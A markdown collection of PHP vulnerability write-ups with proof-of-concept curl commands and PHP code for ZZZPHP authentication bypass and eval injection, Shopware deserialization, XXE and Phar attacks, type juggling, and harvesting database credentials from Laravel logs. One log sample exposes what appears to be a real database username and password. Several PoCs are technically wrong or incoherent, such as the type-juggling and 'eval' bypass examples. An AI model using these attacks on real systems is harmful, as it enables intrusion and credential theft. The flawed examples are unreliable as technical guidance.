# PHP Vulnerabilities

### 1) ZZZPHP ISSESSION adminid Authentication Bypass

#### Vulnerability Analysis

- The application employs a session management mechanism with the option
to use cookies instead.

- Authentication is checked using the get_session() function.

- The ISSESSION constant determines whether to use session or cookie for storage.

- The get_session() function returns user-controlled data if ISSESSION is set to 0.

- The ISSESSION constant is defined as 0, allowing an attacker to manipulate
session data.

- The absence of proper authentication checks allows unauthorized access.

#### PoC

- Sending a request with a crafted cookie grants access without proper authentication.

- Without the cookie, the server redirects to the login page due to failed authentication.

This command sends a GET request to the admin page with the crafted cookie zzz_adminid=1 , bypassing authentication:

      export TARGET_HOST="target:8080
      curl -i -X GET "http://$TARGET_HOST/admin871/?index" -H "Cookie: zzz_adminid=1"

### 2) ZZZPHP parserIfLabel eval PHP Code Injection

#### Vulnerability Analysis

1. Injection Stage:

- The vulnerability allows an attacker to inject arbitrary PHP code into a specific file, in this case, search.html .

- The injection point is within the {if: ... } {end if} template syntax.

2. Execution Stage:

- After injection, the PHP code injected into search.html is executed due to improper handling of template parsing.

- The vulnerable code relies on the eval() function, which executes the injected PHP code.

#### PoC

This command sends a POST request to edit search.html , injecting the PHP code phpinfo() into it.

1. Injecting PHP Code:

        export TARGET_HOST="target:8080"
        curl -X POST "http://$TARGET_HOST/admin871/save.php?act=editfile" -H "Cookie: zzz_adminid=1" -d "file=/template/pc/cn2016/html/search.html&filetext={if:phpinfo()}{end if}"

2. Triggering Execution:

- After injecting the PHP code, accessing the search.html page or triggering its rendering will execute the injected code.

- The execution results in the phpinfo() function being called, disclosing sensitive server information.

### 3) The Ev1l eva1 Deny list

1. The getform() function filters user input but doesn't check $_SERVER , $_REQUEST ,and $_COOKIE .

2. The txt_html() function replaces instances of "eval" with "eva1", attempting to prevent its execution.

3. However, this can be bypassed creatively to achieve code execution.

#### PoC

      <?php
      // Crafted input with 'eval' bypass
      $input = [
      'user_input' => 'eval',
      'server_input' => '<?php phpinfo(); ?>', // Server input
      'cookie_input' => 'cookie_value', // Cookie input
      ];
      // Send the request with crafted input
      // Target the vulnerable function
      send_request($input);

Explanation:

- Craft input containing "eval" in the $_POST data.

- Include PHP code in $_SERVER data.

- The server will process the $_POST data, executing the PHP code in $_SERVER .

- Achieve dynamic code execution despite the "eval" replacement.

### 4) Shopware PHP Object Instantiation

The vulnerability lies in the deserialization process of user-controlled data in the Shopware application, specifically in the ProductStream.php controller. The sort parameter is passed to the unserialize() method, which leads to the execution of arbitrary code due to insecure deserialization.

#### PoC

Craft malicious serialized data with arbitrary code execution

      $serialized_data = 'O:4:"Evil":1:{s:4:"exec";s:8:"phpinfo()";}';

Send the request with crafted serialized data

      curl -X POST "http://target:8080/backend/ProductStream/loadPreview" -d "sort=$serialized_data" -H "Content-Type: application/x-www-form-urlencoded" -u "demo:demo"

Explanation:

- Craft malicious serialized data containing PHP code to execute phpinfo().

- Send the request to the vulnerable endpoint with the crafted serialized data.

- The application deserializes the data and executes the arbitrary PHP code.

### 5) XML Parsing

The vulnerability lies in the XML parsing functionality of the Shopware application, specifically in the handling of external entities. XML External Entity (XXE) injection occurs when the XML parser processes malicious XML data containing references to external entities, leading to various attacks such as information disclosure, server-side request forgery (SSRF), denial of service, and even remote code execution.

#### PoC

Generate CSRF token with authenticated session

      curl -X GET "http://target:8080/backend/CSRFToken/generate" -H "Cookie: SHOPWAREBACKEND=hd3loipaud5dj4mksts2l2ssj1"

Send malicious request triggering XXE injection

      curl -X GET "http://target:8080/backend/ProductStream/loadPreview?sort={}" -H "X-CSRF-Token: s2mwtrAQE4D6wofVRArlVKDGgzQQdQ" -H "Cookie: SHOPWAREBACKEND=6ni6hpb61nu0699siq9judjpcs" -d "{}"

Explanation:

- Generate a CSRF token using the authenticated session.

- Craft a request to the vulnerable endpoint with a malicious JSON payload containing an empty object {} for the sort parameter.

- The application processes the JSON payload, triggering the XXE vulnerability by parsing the XML data from the attacker-supplied URI.

### 6) Crafting the SimpleXMLElement Object for Object Injection

The vulnerability revolves around crafting malicious objects in PHP, particularly leveraging magic methods like __construct for object injection. This can lead to various forms of exploitation, including deserialization attacks and potentially remote code execution

#### PoC

Search for interesting classes and constructors

      grep -ir "__construct" engine/Shopware/ custom/plugins/custom/project/

Craft malicious object with __construct payload

      echo '<?php class Foo { public function __construct($name) { eval($name); }} ?>' > exploit.php
      echo '{"Foo":{"name":"system(\'id\');" }}' > payload.json

Trigger object instantiation with crafted payload

      curl -X GET "http://target:8080/backend/ProductStream/loadPreview?sort=$(cat payload.json)" -H "X-CSRF-Token: s2mwtrAQE4D6wofVRArlVKDGgzQQdQ" -H "Cookie: SHOPWAREBACKEND=6ni6hpb61nu0699siq9judjpcs"

Explanation:

- Search for classes and constructors to identify potential targets for exploitation.

- Craft a PHP file defining a class with a malicious __construct method, allowing arbitrary code execution.

- Generate a JSON payload specifying the class name and constructor arguments.

- Send a crafted request to trigger object instantiation with the malicious payload, potentially leading to code execution.

### 7) Pivot Primitives

The vulnerability revolves around exploiting a deserialization vulnerability in PHP applications, specifically leveraging a class with a vulnerable __construct method.
This allows an attacker to instantiate objects with malicious payloads, leading to arbitrary code execution

#### PoC

      <?php
      // Crafting a malicious object with a vulnerable __construct method
      class Bar {
      public function __construct($name) {
      file_get_contents($name); // Sink for file operation
       }
      }
      // Triggering object instantiation with a crafted payload
      $payload = '{"Bar": {"name": "phar://path/to/malicious.phar"}}';
      // Send a request to trigger object instantiation with the crafted payload
      ?>

Explanation:

- Craft a PHP class with a vulnerable __construct method, allowing file operations with arbitrary file paths.

- Construct a payload specifying the class name and constructor arguments, pointing to a malicious Phar archive.

- Trigger object instantiation by sending a request with the crafted payload, potentially leading to arbitrary code execution.

### 8) Generate a Malicious Phar

The vulnerability stems from a deserialization issue in PHP applications, particularly involving the crafting of malicious Phar (PHP Archive) files. By exploiting vulnerable classes with magic methods such as __destruct and manipulating controlled data, attackers can achieve arbitrary code execution.

#### PoC

      <?php
      // Malicious class with a vulnerable __destruct method
      class FileCookieJar {
      public function __destruct() {
      $this->save($this->filename); // Vulnerable code path
      }
      // Function to save cookies to a file
      public function save($filename) {
      // Process cookies and save to file
       }
      }
      // Generating a malicious Phar payload
      $phar = new Phar('malicious.phar');
      $phar->startBuffering();
      $phar->setStub('<?php __HALT_COMPILER(); ?>');
      // Add a malicious object of FileCookieJar class as metadata
      $object = new FileCookieJar;
      $object->filename = "path/to/malicious.php";
      $phar->setMetadata($object);
      $phar->stopBuffering();
      ?>

Explanation:

- Craft a PHP class ( FileCookieJar ) with a vulnerable __destruct method, allowing file operations with controlled file paths.

- Generate a malicious Phar archive containing the crafted object of the vulnerable class.

- Set the metadata of the Phar archive to the malicious object, specifying the filename for potential exploitation.

- The Phar archive can be used to trigger object deserialization and execute arbitrary code via the vulnerable __destruct method.

### 9) Technique for POP chain development

The vulnerability lies in deserialization issues in PHP applications, allowing attackers to execute arbitrary code by manipulating serialized objects. By crafting malicious serialized payloads, attackers can exploit vulnerable classes with magic methods like __construct and __destruct to achieve code execution.

#### PoC

      <?php
      // Vulnerable class with __construct and __destruct methods
      class SourceIncite {
      private $data;
      public function __construct($data){
      $this->data = $data;
      }
      public function __destruct(){
      echo $this->data."\r\n";
       }
      }
      // Serialized payload with controlled data property
      $serialized = 'O:12:"SourceIncite":1:{s:4:"data";s:4:"test";}';
      // Deserialize the payload
      var_dump(unserialize($serialized));
      ?>

Explanation:

- Define a vulnerable PHP class ( SourceIncite ) with __construct and __destruct methods.

- Craft a serialized payload setting a controlled data property ( data ) to exploit the class.

- Deserialize the payload to trigger the execution of the __destruct method and print the controlled data.

### 10) Type Juggling

Type juggling vulnerabilities arise due to the loose comparison operators in PHP, such as == and != . These operators perform type coercion, allowing different data types to be compared. However, this can lead to unexpected behavior when comparing variables of different types. Attackers can exploit this behavior to bypass authentication, perform unauthorized actions, or manipulate data.

#### PoC

      <?php
      // Vulnerable authentication function
      function authenticate($user_input) {
      $expected_password = 'admin123';
      return $user_input == $expected_password;
      }
      // Attacker-supplied password
      $attacker_password = '0e123456'; // A string starting with '0e'
      coerces to float 0 when compared
      // Attempt authentication with attacker-supplied password
      $is_authenticated = authenticate($attacker_password);
      // Check authentication result
      if ($is_authenticated) {
      echo "Authentication successful";
      } else {
      echo "Authentication failed";
      }
      ?>

Explanation:

- Define a vulnerable authentication function authenticate that compares user-supplied password with the expected password using loose comparison operator == .

- Attacker supplies a password ( $attacker_password ) starting with '0e', which coerces to float 0 when compared.

- Attempt authentication with attacker-supplied password.

- Due to type juggling vulnerability, the comparison evaluates to true, allowing the attacker to bypass authentication.

### 11) Time of Check Time of Use (TOCTOU)

Time of Check Time of Use (TOCTOU) vulnerabilities occur when a program's behavior depends on the timing of events, such as file system operations, without proper synchronization. This can lead to security issues when an attacker manipulates the state of the system between the time of a check (e.g., file existence) and the time of use (e.g., file access). Common examples include race conditions in file operations, where a file's existence or permissions are checked, but the file's state changes before it is used, leading to unauthorized access or manipulation.

#### PoC

      <?php
      // Vulnerable file access function
      function read_secret_file($file_path) {
      if (file_exists($file_path)) {
      // Check file existence
      $contents = file_get_contents($file_path);
      // Read file contents
      return $contents;
      } else {
      return "File not found";
       }
      }
      // Attacker manipulates file path during time of use
      $attacker_file = "secret_file.txt";
      $secret_contents = read_secret_file($attacker_file);
      echo $secret_contents;
      ?>

Explanation:

- Define a vulnerable function read_secret_file that checks if a file exists using file_exists and reads its contents using file_get_contents .

- Attacker manipulates the file path during time of use to point to a file they control.

- Between the time of file existence check and file access, attacker replaces the file with their own content, leading to unauthorized access to sensitive data.

### 12) Race Condition

In modern PHP applications, race condition vulnerabilities can still occur, especially in scenarios where multiple requests are handled concurrently and access shared resources such as files or databases. These vulnerabilities can lead to unexpected behavior, data corruption, or security breaches if not properly handled. Let's explore a race condition vulnerability in a PHP application and demonstrate both non-compliant and compliant approaches, along with potential attacks.

Consider a PHP application that allows users to upload files. The application saves uploaded files with a unique filename based on the current timestamp. However, due to a race condition, an attacker may be able to manipulate the filename after validation but before saving, potentially overwriting legitimate files or executing arbitrary code.

      <?php
      // Vulnerable PHP code allowing race condition
      if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
      $file = $_FILES['file'];
      $targetDir = '/var/www/uploads/';
      $targetFile = $targetDir . basename($file['name']);
      // Check if file already exists
      if (file_exists($targetFile)) {
      die('File already exists.');
      }
      // Perform file validation
      if ($file['size'] > 1000000) {
      die('File is too large.');
      }

      // Move the file to the uploads directory
      if (move_uploaded_file($file['tmp_name'], $targetFile)) {
      echo 'File uploaded successfully.';
      } else {
      echo 'Error uploading file.';
       }
      }
      ?>

An attacker can exploit the race condition by performing the following steps:

1. Send a POST request to upload a file.

2. While the application performs validation, quickly send another POST request with a file having the same name as the previously uploaded file.

3. Due to the race condition, the second request may overwrite the legitimate file, leading to a denial of service or potentially executing malicious code if the application includes the uploaded file.

### 13) Laravel Framework vs laravel.log

The vulnerability in the Laravel Framework versions '8* to 11*', identified by CVE-2024-29291, allows remote attackers to access sensitive information, specifically database credentials, through the laravel.log component. This type of vulnerability poses a high risk as it enables attackers to obtain critical information needed to access the database, potentially leading to unauthorized access, data manipulation, or exfiltration.

The vulnerability arises due to the exposure of database credentials in the laravel.log file, which is typically used for logging purposes. Attackers can exploit this by accessing the log file, searching for specific patterns indicative of database connection strings, and retrieving the database credentials contained within them.

#### PoC

Sample log entry from laravel.log

      #0 /home/u429384055/domains/jscvdocs.
      online/public_html/vendor/laravel/framework/src/Illuminate/Data
      base/Connectors/Connector.php(70): PDO-
      >__construct('mysql:host=sql1...', 'u429384055_jscv',
      'Jaly$$a0p0p0p0', Array)

From the log entry:

      - Username: u429384055_jscv
      - Password: Jaly$$a0p0p0p0
      - Host: sql1...

Attack Scenario:

1. Identify Target: Locate a website built with the vulnerable Laravel Framework versions (8.* to 11.*).

2. Access Log File: Navigate to the storage/logs/laravel.log directory on the target server.

3. Search for Database Connection Strings: Look for entries containing PDO->__construct('mysql:host=') , indicating database connection initialization.

4. Extract Credentials: Retrieve the database credentials from the log entries, including the username, password, and host information.

5. Database Access: Utilize the obtained credentials to gain unauthorized access to the target database.

